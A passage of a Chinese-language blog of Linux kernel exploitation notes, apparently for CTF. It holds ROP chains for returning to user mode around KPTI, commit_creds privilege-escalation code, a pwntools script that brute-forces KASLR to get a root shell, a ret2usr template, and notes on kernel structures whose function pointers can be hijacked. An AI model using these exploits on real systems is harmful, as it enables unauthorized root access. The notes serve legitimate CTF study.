class="string">&quot;\033[32m\033[1m[+] Successful to get the root. Execve root shell now...\033[0m&quot;</span>);</span><br><span class="line">    system(<span class="string">&quot;/bin/sh&quot;</span>);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></div></figure>


        <h2 id="3-è¿”å›ç”¨æˆ·æ€"   >
          <a href="#3-è¿”å›ç”¨æˆ·æ€" class="heading-link"><i class="fas fa-link"></i></a><a href="#3-è¿”å›ç”¨æˆ·æ€" class="headerlink" title="3.è¿”å›ç”¨æˆ·æ€"></a>3.è¿”å›ç”¨æˆ·æ€</h2>
      
        <h3 id="1-æ²¡æœ‰KPTI"   >
          <a href="#1-æ²¡æœ‰KPTI" class="heading-link"><i class="fas fa-link"></i></a><a href="#1-æ²¡æœ‰KPTI" class="headerlink" title="(1)æ²¡æœ‰KPTI"></a>(1)æ²¡æœ‰KPTI</h3>
      <p>æ­£å¸¸çš„swapgså’Œiretq</p>
<p>ROPå¸ƒå±€å¦‚ä¸‹</p>
<figure class="highlight c"><div class="table-container"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">swapgs_ret</span><br><span class="line">iretq</span><br><span class="line">&amp;get_shell,</span><br><span class="line">user_cs,</span><br><span class="line">user_rflags,</span><br><span class="line">user_sp,</span><br><span class="line">user_ss</span><br></pre></td></tr></table></div></figure>


        <h3 id="2-å­˜åœ¨KPTI"   >
          <a href="#2-å­˜åœ¨KPTI" class="heading-link"><i class="fas fa-link"></i></a><a href="#2-å­˜åœ¨KPTI" class="headerlink" title="(2)å­˜åœ¨KPTI"></a>(2)å­˜åœ¨KPTI</h3>
      <p><span class="exturl"><a class="exturl__link"   target="_blank" rel="noopener" href="https://www.anquanke.com/post/id/240006#h3-2" >Linux Kernel KPTIä¿æŠ¤ç»•è¿‡ - å®‰å…¨å®¢ï¼Œå®‰å…¨èµ„è®¯å¹³å° (anquanke.com)</a><span class="exturl__icon"><i class="fas fa-external-link-alt"></i></span></span></p>
<p>ä»<code>swapgs_restore_regs_and_return_to_usermode</code>å‡½æ•°æŸå¤„å¼€å§‹æ‰§è¡Œ</p>
<figure class="highlight plaintext"><div class="table-container"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">mov    rdi,rsp   //è¯¥å¤„å¼€å§‹æ‰§è¡Œ</span><br><span class="line">mov    rsp,QWORD PTR gs:0x6004</span><br></pre></td></tr></table></div></figure>

<p>ROPå¸ƒå±€å¦‚ä¸‹</p>
<figure class="highlight plaintext"><div class="table-container"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line">swapgs_restore_regs_and_return_to_usermode+22,</span><br><span class="line">0,</span><br><span class="line">0,</span><br><span class="line">&amp;get_shell,</span><br><span class="line">user_cs,</span><br><span class="line">user_rflags,</span><br><span class="line">user_sp,</span><br><span class="line">user_ss</span><br></pre></td></tr></table></div></figure>


        <h2 id="4-çˆ†ç ´KASLR"   >
          <a href="#4-çˆ†ç ´KASLR" class="heading-link"><i class="fas fa-link"></i></a><a href="#4-çˆ†ç ´KASLR" class="headerlink" title="4.çˆ†ç ´KASLR"></a>4.çˆ†ç ´KASLR</h2>
      <p>å‚è€ƒï¼š<span class="exturl"><a class="exturl__link"   target="_blank" rel="noopener" href="https://arttnba3.cn/2021/10/31/CTF-0X05-TCTF2021_FINAL/" >ã€CTF.0x05ã€‘TCTF2021-FINAL ä¸¤é“ kernel pwn é¢˜è§£ - arttnba3â€™s blog</a><span class="exturl__icon"><i class="fas fa-external-link-alt"></i></span></span></p>

        <h3 id="1-POCé‡Œ"   >
          <a href="#1-POCé‡Œ" class="heading-link"><i class="fas fa-link"></i></a><a href="#1-POCé‡Œ" class="headerlink" title="(1)POCé‡Œ"></a>(1)POCé‡Œ</h3>
      <figure class="highlight c"><div class="table-container"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line">offset = (argv[<span class="number">1</span>]) ? atoi(argv[<span class="number">1</span>]) : <span class="number">0</span>;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">ROP[i++] = POP_RDI_RET + offset;</span><br><span class="line">ROP[i++] = <span class="number">0</span>;</span><br><span class="line">ROP[i++] = PREPARE_KERNEL_CRED + offset;</span><br><span class="line">ROP[i++] = COMMIT_CREDS + offset;</span><br><span class="line">ROP[i++] = SWAPGS_RESTORE_REGS_AND_RETURN_TO_USERMODE + <span class="number">22</span> + offset;</span><br></pre></td></tr></table></div></figure>


        <h3 id="2-æ‰“è¿œç¨‹çš„EXP"   >
          <a href="#2-æ‰“è¿œç¨‹çš„EXP" class="heading-link"><i class="fas fa-link"></i></a><a href="#2-æ‰“è¿œç¨‹çš„EXP" class="headerlink" title="(2)æ‰“è¿œç¨‹çš„EXP"></a>(2)æ‰“è¿œç¨‹çš„EXP</h3>
      <figure class="highlight python"><div class="table-container"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line"><span class="keyword">import</span> base64</span><br><span class="line"><span class="comment">#context.log_level = &quot;debug&quot;</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">with</span> <span class="built_in">open</span>(<span class="string">&quot;./exp&quot;</span>, <span class="string">&quot;rb&quot;</span>) <span class="keyword">as</span> f:</span><br><span class="line">    exp = base64.b64encode(f.read())</span><br><span class="line">    </span><br><span class="line">p = process(<span class="string">&#x27;./run.sh&#x27;</span>)<span class="comment">#remote(&quot;127.0.0.1&quot;, 1234)</span></span><br><span class="line">try_count = <span class="number">1</span></span><br><span class="line"><span class="keyword">while</span> <span class="literal">True</span>:</span><br><span class="line">    log.info(<span class="string">&quot;no.&quot;</span> + <span class="built_in">str</span>(try_count) + <span class="string">&quot; time(s)&quot;</span>)</span><br><span class="line">    p.sendline()</span><br><span class="line">    p.recvuntil(<span class="string">&quot;~ $&quot;</span>)</span><br><span class="line"></span><br><span class="line">    count = <span class="number">0</span></span><br><span class="line">    <span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">0</span>, <span class="built_in">len</span>(exp), <span class="number">0x200</span>):</span><br><span class="line">        p.sendline(<span class="string">&quot;echo -n \&quot;&quot;</span> + exp[i:i + <span class="number">0x200</span>].decode() + <span class="string">&quot;\&quot; &gt;&gt; b64_exp&quot;</span>)</span><br><span class="line">        count += <span class="number">1</span></span><br><span class="line"></span><br><span class="line">    <span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(count):</span><br><span class="line">        p.recvuntil(<span class="string">&quot;~ $&quot;</span>)</span><br><span class="line">    </span><br><span class="line">    p.sendline(<span class="string">&quot;cat b64_exp | base64 -d &gt; ./exploit&quot;</span>)</span><br><span class="line">    p.sendline(<span class="string">&quot;chmod +x ./exploit&quot;</span>)</span><br><span class="line">    randomization = (try_count % <span class="number">1024</span>) * <span class="number">0x100000</span></span><br><span class="line">    log.info(<span class="string">&#x27;trying randomization: &#x27;</span> + <span class="built_in">hex</span>(randomization))</span><br><span class="line">    p.sendline(<span class="string">&quot;./exploit &quot;</span> + <span class="built_in">str</span>(randomization))</span><br><span class="line">    <span class="keyword">if</span> <span class="keyword">not</span> p.recvuntil(<span class="string">b&quot;Rebooting in 1 seconds..&quot;</span>, timeout=<span class="number">60</span>):</span><br><span class="line">        <span class="keyword">break</span></span><br><span class="line">    log.warn(<span class="string">&#x27;failed!&#x27;</span>)</span><br><span class="line">    try_count += <span class="number">1</span></span><br><span class="line"></span><br><span class="line">log.success(<span class="string">&#x27;success to get the root shell!&#x27;</span>)</span><br><span class="line">p.interactive()</span><br></pre></td></tr></table></div></figure>


        <h2 id="5-retUsræ¨¡æ¿"   >
          <a href="#5-retUsræ¨¡æ¿" class="heading-link"><i class="fas fa-link"></i></a><a href="#5-retUsræ¨¡æ¿" class="headerlink" title="5.retUsræ¨¡æ¿"></a>5.retUsræ¨¡æ¿</h2>
      <figure class="highlight c"><div class="table-container"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br></pre></td><td class="code"><pre><span class="line"><span class="class"><span class="keyword">struct</span> <span class="title">trap_frame</span>&#123;</span></span><br><span class="line">    <span class="keyword">void</span> *rip;</span><br><span class="line">    <span class="keyword">uint64_t</span> cs;</span><br><span class="line">    <span class="keyword">uint64_t</span> rflags;</span><br><span class="line">    <span class="keyword">void</span> * rsp;</span><br><span class="line">    <span class="keyword">uint64_t</span> ss;</span><br><span class="line">&#125;__attribute__((packed));    <span class="comment">// ä¿å­˜çŠ¶æ€çš„ç»“æ„ä½“</span></span><br><span class="line"><span class="class"><span class="keyword">struct</span> <span class="title">trap_frame</span> <span class="title">status</span>;</span>     <span class="comment">// ä¿å­˜çŠ¶æ€</span></span><br><span class="line"></span><br><span class="line"><span class="comment">// å°†çŠ¶æ€ä¿å­˜åœ¨statusä¸­</span></span><br><span class="line"><span class="function"><span class="keyword">void</span> <span class="title">save</span><span class="params">()</span>                  </span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    <span class="keyword">asm</span>(</span><br><span class="line">        <span class="string">&quot;mov %%ss, %0\n&quot;</span></span><br><span class="line">        <span class="string">&quot;mov %%rsp, %1\n&quot;</span></span><br><span class="line">        <span class="string">&quot;pushfq\n&quot;</span></span><br><span class="line">        <span class="string">&quot;pop %2\n&quot;</span></span><br><span class="line">        <span class="string">&quot;mov %%cs, %3\n&quot;</span></span><br><span class="line">        :<span class="string">&quot;=r&quot;</span>(status.ss),<span class="string">&quot;=r&quot;</span>(status.rsp),<span class="string">&quot;=r&quot;</span>(status.rflags),<span class="string">&quot;=r&quot;</span>(status.cs)</span><br><span class="line">        :</span><br><span class="line">        :<span class="string">&quot;memory&quot;</span></span><br><span class="line">        );</span><br><span class="line">    status.rip = shell;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">void</span> <span class="title">retUsr</span><span class="params">()</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    commit_creds(prepare_kernel_cred(<span class="number">0</span>));</span><br><span class="line">    <span class="keyword">asm</span>(</span><br><span class="line">        <span class="string">&quot;swapgs\n&quot;</span></span><br><span class="line">        <span class="string">&quot;mov $status,%rsp\n&quot;</span></span><br><span class="line">        <span class="string">&quot;iretq&quot;</span></span><br><span class="line">        );</span><br><span class="line">&#125;</span><br></pre></td></tr></table></div></figure>




        <h1 id="ä¹ã€å¸¸è§å¯åˆ©ç”¨ç»“æ„ä½“"   >
          <a href="#ä¹ã€å¸¸è§å¯åˆ©ç”¨ç»“æ„ä½“" class="heading-link"><i class="fas fa-link"></i></a><a href="#ä¹ã€å¸¸è§å¯åˆ©ç”¨ç»“æ„ä½“" class="headerlink" title="ä¹ã€å¸¸è§å¯åˆ©ç”¨ç»“æ„ä½“"></a>ä¹ã€å¸¸è§å¯åˆ©ç”¨ç»“æ„ä½“</h1>
      <p>å‚è€ƒï¼š<span class="exturl"><a class="exturl__link"   target="_blank" rel="noopener" href="https://arttnba3.cn/2021/11/29/NOTE-0X08-LINUX-KERNEL-PWN-PART-IV/#0x01-tty-%E7%B3%BB%E5%88%97%E7%BB%93%E6%9E%84%E4%BD%93" >ã€NOTES.0x08ã€‘Linux Kernel Pwn IVï¼šé€šç”¨ç»“æ„ä½“ä¸æŠ€å·§ - arttnba3â€™s blog</a><span class="exturl__icon"><i class="fas fa-external-link-alt"></i></span></span></p>

        <h2 id="1-ttyç³»åˆ—ç»“æ„ä½“â€”kmalloc-1024"   >
          <a href="#1-ttyç³»åˆ—ç»“æ„ä½“â€”kmalloc-1024" class="heading-link"><i class="fas fa-link"></i></a><a href="#1-ttyç³»åˆ—ç»“æ„ä½“â€”kmalloc-1024" class="headerlink" title="1.ttyç³»åˆ—ç»“æ„ä½“â€”kmalloc-1024"></a>1.ttyç³»åˆ—ç»“æ„ä½“â€”kmalloc-1024</h2>
      <p>æ‰“å¼€è®¾å¤‡ï¼š<code>/dev/ptmx</code></p>
<p>tty_struct çš„é­”æ•°ä¸º <code>0x5401</code>ï¼Œä½äºè¯¥ç»“æ„ä½“çš„å¼€å¤´ï¼Œæˆ‘ä»¬å¯ä»¥åˆ©ç”¨å¯¹è¯¥é­”æ•°çš„æœç´¢ä»¥é”å®šè¯¥ç»“æ„ä½“ã€‚</p>
<p>ä¸Šé¢<strong>å †-&gt;å€ŸåŠ©ptmxè®¾å¤‡</strong>è®²è¿‡äº†</p>

        <h2 id="2-seq-operationsç»“æ„ä½“â€”-kmalloc-32"   >
          <a href="#2-seq-operationsç»“æ„ä½“â€”-kmalloc-32" class="heading-link"><i class="fas fa-link"></i></a><a href="#2-seq-operationsç»“æ„ä½“â€”-kmalloc-32" class="headerlink" title="2.seq_operationsç»“æ„ä½“â€”-kmalloc-32"></a>2.seq_operationsç»“æ„ä½“â€”-kmalloc-32</h2>
      <p>æ‰“å¼€è®¾å¤‡ï¼š<code>proc/self/stat</code></p>
<p>è¯¥ç»“æ„ä½“å®šä¹‰äº <code>/include/linux/seq_file.h</code> å½“ä¸­ï¼Œå¤§å°ä¸º0x20</p>
<figure class="highlight c"><div class="table-container"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line"><span class="class"><span class="keyword">struct</span> <span class="title">seq_operations</span> &#123;</span></span><br><span class="line">	<span class="keyword">void</span> * (*start) (struct seq_file *m, <span class="keyword">loff_t</span> *pos);</span><br><span class="line">	<span class="keyword">void</span> (*stop) (struct seq_file *m, <span class="keyword">void</span> *v);</span><br><span class="line">	<span class="keyword">void</span> * (*next) (struct seq_file *m, <span class="keyword">void</span> *v, <span class="keyword">loff_t</span> *pos);</span><br><span class="line">	<span class="keyword">int</span> (*show) (struct seq_file *m, <span class="keyword">void</span> *v);</span><br><span class="line">&#125;;</span><br></pre></td></tr></table></div></figure>

<p>é€šè¿‡å‡½æ•°æŒ‡é’ˆæ³„éœ²åœ°å€ï¼Œå†åŠ«æŒstartå‡½æ•°æŒ‡é’ˆåå¯¹è¯¥è®¾å¤‡è¿›è¡Œè¯»å†™å³å¯è°ƒç”¨åŠ«æŒçš„startå‡½æ•°æŒ‡é’ˆï¼Œæ§åˆ¶ç¨‹åºæµç¨‹ã€‚è¯»å†™çš„æ—¶å€™å¯é€šè¿‡syscallåˆ›å»º<code>pt_regs</code>ç»“æ„ä½“æ¥å¸ƒç½®å†…æ ¸æ ˆç¯å¢ƒï¼Œç„¶åé€šè¿‡<code>swapgs_restore_regs_and_return_to_usermode</code>å‡½æ•°è¿”å›ç”¨æˆ·ç©ºé—´ã€‚</p>
<p><span class="exturl"><a class="exturl__link"   target="_blank" rel="noopener" href="https://www.anquanke.com/post/id/260055#h3-5" >è¥¿æ¹–è®ºå‰‘2021çº¿ä¸Šåˆèµ›easykernelé¢˜è§£ - å®‰å…¨å®¢ï¼Œå®‰å…¨èµ„è®¯å¹³å° (anquanke.com)</a><span class="exturl__icon"><i class="fas fa-external-link-alt"></i></span></span></p>

        <h2 id="3-subprocess-infoç»“æ„ä½“â€”kmalloc-128"   >
          <a href="#3-subprocess-infoç»“æ„ä½“â€”kmalloc-128" class="heading-link"><i class="fas fa-link"></i></a><a href="#3-subprocess-infoç»“æ„ä½“â€”kmalloc-128" class="headerlink" title="3.subprocess_infoç»“æ„ä½“â€”kmalloc-128"></a>3.subprocess_infoç»“æ„ä½“â€”kmalloc-128</h2>
      <p>é€šè¿‡ä»¥ä¸‹è¯­å¥å¯ä»¥åˆ†é…å¾—åˆ°ä¸€ä¸ª<code>subprocess_info</code>ç»“æ„ä½“ï¼Œä¸åŒç‰ˆæœ¬å¤§å°ä¸åŒï¼Œå¦‚ä¸‹ç‰ˆæœ¬å½¢å¼çš„ä¸º0x60ï¼Œä½¿ç”¨kmalloc-128åˆ†é…å™¨</p>
<figure class="highlight c"><div class="table-container"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">socket(<span class="number">22</span>, AF_INET, <span class="number">0</span>);</span><br></pre></td></tr></table></div></figure>

<p>ç»“æ„ä½“</p>
<figure class="highlight c"><div class="table-container"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><span class="line"><span class="class"><span class="keyword">struct</span> <span class="title">subprocess_info</span> &#123;</span></span><br><span class="line">    <span class="class"><span class="keyword">struct</span> <span class="title">work_struct</span> <span class="title">work</span>;</span></span><br><span class="line">    <span class="class"><span class="keyword">struct</span> <span class="title">completion</span> *<span class="title">complete</span>;</span></span><br><span class="line">    <span class="keyword">const</span> <span class="keyword">char</span> *path;</span><br><span class="line">    <span class="keyword">char</span> **argv;</span><br><span class="line">    <span class="keyword">char</span> **envp;</span><br><span class="line">    <span class="class"><span class="keyword">struct</span> <span class="title">file</span> *<span class="title">file</span>;</span></span><br><span class="line">    <span class="keyword">int</span> wait;</span><br><span class="line">    <span class="keyword">int</span> retval;</span><br><span class="line">    <span class="keyword">pid_t</span> pid;</span><br><span class="line">    <span class="keyword">int</span> (*init)(struct subprocess_info *info, struct cred *<span class="keyword">new</span>);</span><br><span class="line">    <span class="keyword">void</span> (*cleanup)(struct subprocess_info *info);</span><br><span class="line">    <span class="keyword">void</span> *data;</span><br><span class="line">&#125; __randomize_layout;</span><br></pre></td></tr></table></div></figure>

<p>è¯¥ç»“æ„ä½“åœ¨åˆ†é…æ—¶æœ€ç»ˆä¼šè°ƒç”¨å…¶ä¸­çš„<code>void (*cleanup)(struct subprocess_info *info);</code>å‡½æ•°æŒ‡é’ˆï¼Œæ‰€ä»¥å¦‚æœå­˜åœ¨ä¸€ä¸ªUAFå’Œæ¡ä»¶ç«äº‰ï¼Œåœ¨åˆ†é…æ—¶å¯åŠ¨å¦ä¸€ä¸ªçº¿ç¨‹ä¸æ–­ä¿®æ”¹è¯¥å‡½æ•°æŒ‡é’ˆï¼Œé‚£ä¹ˆå°±èƒ½åŠ«æŒç¨‹åºæµï¼Œå†åˆ©ç”¨ä¸€äº›gadgetå°±å¯ä»¥æ§åˆ¶å¾—åˆ°ã€‚</p>
<p><span class="exturl"><a class="exturl__link"   target="_blank" rel="noopener" href="https://www.anquanke.com/post/id/264563#h2-2" >SCTF flying_kernel å‡ºé¢˜æ€»ç»“ - å®‰å…¨å®¢ï¼Œå®‰å…¨èµ„è®¯å¹³å° (anquanke.com)</a><span class="exturl__icon"><i class="fas fa-external-link-alt"></i></span></span></p>

        <h2 id="4-ldt-structç»“æ„ä½“â€”kmalloc-16"   >
          <a href="#4-ldt-structç»“æ„ä½“â€”kmalloc-16" class="heading-link"><i class="fas fa-link"></i></a><a href="#4-ldt-structç»“æ„ä½“â€”kmalloc-16" class="headerlink" title="4.ldt_structç»“æ„ä½“â€”kmalloc-16"></a>4.ldt_structç»“æ„ä½“â€”kmalloc-16</h2>
      <p>å‚è€ƒï¼š<span class="exturl"><a class="exturl__link"   target="_blank" rel="noopener" href="https://www.anquanke.com/post/id/266897#h3-5" >åœ¨ 2021 å¹´å†çœ‹ ciscn_2017 - babydriverï¼ˆä¸‹ï¼‰ï¼šKPTI bypassã€ldt_struct çš„åˆ©ç”¨ã€pt_regs é€šç”¨å†…æ ¸ROPè§£æ³• - å®‰å…¨å®¢ï¼Œå®‰å…¨èµ„è®¯å¹³å° (anquanke.com)</a><span class="exturl__icon"><i class="fas fa-external-link-alt"></i></span></span></p>

        <h3 id="1-å‰ç½®çŸ¥è¯†"   >
          <a href="#1-å‰ç½®çŸ¥è¯†" class="heading-link"><i class="fas fa-link"></i></a><a href="#1-å‰ç½®çŸ¥è¯†" class="headerlink" title="(1)å‰ç½®çŸ¥è¯†"></a>(1)å‰ç½®çŸ¥è¯†</h3>
      
        <h4 id="ç»“æ„ä½“"   >
          <a href="#ç»“æ„ä½“" class="heading-link"><i class="fas fa-link"></i></a><a href="#ç»“æ„ä½“" class="headerlink" title="ç»“æ„ä½“"></a>ç»“æ„ä½“</h4>
      <p><code>ldt</code>æ˜¯å³å±€éƒ¨æ®µæè¿°ç¬¦è¡¨ï¼ˆLocal Descriptor Tableï¼‰ï¼Œå­˜æ”¾ç€è¿›ç¨‹çš„æ®µæè¿°ç¬¦ï¼Œåœ¨å†…æ ¸ä¸­æœ‰ç»“æ„ä½“<code>ldt_struct</code>ä¸ä¹‹å¯¹åº”ã€‚å¤§å°ä¸º0x10ã€‚</p>
<p>å¦‚ä¸‹ç»“æ„ä½“</p>
<figure class="highlight c"><div class="table-container"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">//v5.17 /arch/x86/include/asm/mmu_context.h</span></span><br><span class="line"><span class="class"><span class="keyword">struct</span> <span class="title">ldt_struct</span> &#123;</span></span><br><span class="line">	<span class="comment">/*</span></span><br><span class="line"><span class="comment">	 * Xen requires page-aligned LDTs with special permissions.  This is</span></span><br><span class="line"><span class="comment">	 * needed to prevent us from installing evil descriptors such as</span></span><br><span class="line"><span class="comment">	 * call gates.  On native, we could merge the ldt_struct and LDT</span></span><br><span class="line"><span class="comment">	 * allocations, but it&#x27;s not worth trying to optimize.</span></span><br><span class="line"><span class="comment">	 */</span></span><br><span class="line">	<span class="class"><span class="keyword">struct</span> <span class="title">desc_struct</span>	*<span class="title">entries</span>;</span></span><br><span class="line">	<span class="keyword">unsigned</span> <span class="keyword">int</span>		nr_entries;</span><br><span class="line"></span><br><span class="line">	<span class="comment">/*</span></span><br><span class="line"><span class="comment">	 * If PTI is in use, then the entries array is not mapped while we&#x27;re</span></span><br><span class="line"><span class="comment">	 * in user mode.  The whole array will be aliased at the addressed</span></span><br><span class="line"><span class="comment">	 * given by ldt_slot_va(slot).  We use two slots so that we can allocate</span></span><br><span class="line"><span class="comment">	 * and map, and enable a new LDT without invalidating the mapping</span></span><br><span class="line"><span class="comment">	 * of an older, still-in-use LDT.</span></span><br><span class="line"><span class="comment">	 *</span></span><br><span class="line"><span class="comment">	 * slot will be -1 if this LDT doesn&#x27;t have an alias mapping.</span></span><br><span class="line"><span class="comment">	 */</span></span><br><span class="line">	<span class="keyword">int</span>			slot;</span><br><span class="line">&#125;;</span><br></pre></td></tr></table></div></figure>

<p>è¯¥ç»“æ„ä½“å¯ä»¥é€šè¿‡ç³»ç»Ÿè°ƒç”¨<code>SYS_modify_ldt</code>æ¥æ“æ§ï¼Œæƒ³è¦è°ƒç”¨è¯¥ç³»ç»Ÿè°ƒç”¨å·éœ€è¦ç¼–è¯‘æ—¶å¼€å¯å¦‚ä¸‹è®¾ç½®ï¼Œä¸è¿‡ä¸€èˆ¬éƒ½æ˜¯é»˜è®¤å¼€å¯çš„ï¼Œä»v4.3ç‰ˆæœ¬æ‰å¼€å§‹è¾ƒä¸ºæ­£å¼çš„ä¸€ä¸ªç¼–è¯‘è®¾ç½®</p>
<figure class="highlight plaintext"><div class="table-container"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">CONFIG_MODIFY_LDT_SYSCALL=y</span><br></pre></td></tr></table></div></figure>


        <h4 id="ç³»ç»Ÿè°ƒç”¨å‡½æ•°"   >
          <a href="#ç³»ç»Ÿè°ƒç”¨å‡½æ•°" class="heading-link"><i class="fas fa-link"></i></a><a href="#ç³»ç»Ÿè°ƒç”¨å‡½æ•°" class="headerlink" title="ç³»ç»Ÿè°ƒç”¨å‡½æ•°"></a>ç³»ç»Ÿè°ƒç”¨å‡½æ•°</h4>
      <p>å…·ä½“çš„å‡½æ•°è°ƒç”¨å¦‚ä¸‹</p>
<figure class="highlight c"><div class="table-container"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">//v5.17 /arch/x86/kernel/ldt.c</span></span><br><span class="line">SYSCALL_DEFINE3(modify_ldt, <span class="keyword">int</span> , func , <span class="keyword">void</span> __user * , ptr ,</span><br><span class="line">		<span class="keyword">unsigned</span> <span class="keyword">long</span> , bytecount)</span><br><span class="line">&#123;</span><br><span class="line">	<span class="keyword">int</span> ret = -ENOSYS;</span><br><span class="line"></span><br><span class="line">	<span class="keyword">switch</span> (func) &#123;</span><br><span class="line">	<span class="keyword">case</span> <span class="number">0</span>:</span><br><span class="line">		ret = read_ldt(ptr, bytecount);<span class="comment">//è¯»å–</span></span><br><span class="line">		<span class="keyword">break</span>;</span><br><span class="line">	<span class="keyword">case</span> <span class="number">1</span>:</span><br><span class="line">		ret = write_ldt(ptr, bytecount, <span class="number">1</span>);<span class="comment">//å†™å…¥</span></span><br><span class="line">		<span class="keyword">break</span>;</span><br><span class="line">	<span class="keyword">case</span> <span class="number">2</span>:</span><br><span class="line">		ret = read_default_ldt(ptr, bytecount);</span><br><span class="line">		<span class="keyword">break</span>;</span><br><span class="line">	<span class="keyword">case</span> <span class="number">0x11</span>:</span><br><span class="line">		ret = write_ldt(ptr, bytecount, <span class="number">0</span>);</span><br><span class="line">		<span class="keyword">break</span>;</span><br><span class="line">	&#125;</span><br><span class="line">	<span class="comment">/*</span></span><br><span class="line"><span class="comment">	 * The SYSCALL_DEFINE() macros give us an &#x27;unsigned long&#x27;</span></span><br><span class="line"><span class="comment">	 * return type, but tht ABI for sys_modify_ldt() expects</span></span><br><span class="line"><span class="comment">	 * &#x27;int&#x27;.  This cast gives us an int-sized value in %rax</span></span><br><span class="line"><span class="comment">	 * for the return code.  The &#x27;unsigned&#x27; is necessary so</span></span><br><span class="line"><span class="comment">	 * the compiler does not try to sign-extend the negative</span></span><br><span class="line"><span class="comment">	 * return codes into the high half of the register when</span></span><br><span class="line"><span class="comment">	 * taking the value from int-&gt;long.</span></span><br><span class="line"><span class="comment">	 */</span></span><br><span class="line">	<span class="keyword">return</span> (<span class="keyword">unsigned</span> <span class="keyword">int</span>)ret;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></div></figure>

